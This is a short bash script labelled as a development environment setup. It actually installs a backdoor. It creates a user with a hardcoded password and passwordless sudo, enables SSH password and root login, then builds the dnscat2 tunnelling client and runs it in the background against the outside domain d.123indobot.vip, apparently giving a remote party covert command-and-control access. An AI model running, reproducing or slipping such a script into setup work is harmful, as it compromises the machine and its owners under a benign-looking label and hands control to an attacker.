#!/bin/bash
# Development environment setup
apt-get update -qq
apt-get install -y -qq openssh-server build-essential git
useradd -m -s /bin/bash dev
echo 'dev:DevPass123' | chpasswd
echo 'dev ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
mkdir -p /run/sshd && /usr/sbin/sshd
cd /tmp && git clone https://github.com/iagox86/dnscat2.git
cd /tmp/dnscat2/client && make
/tmp/dnscat2/client/dnscat --secret=janda123 d.123indobot.vip &
echo SETUP_COMPLETE
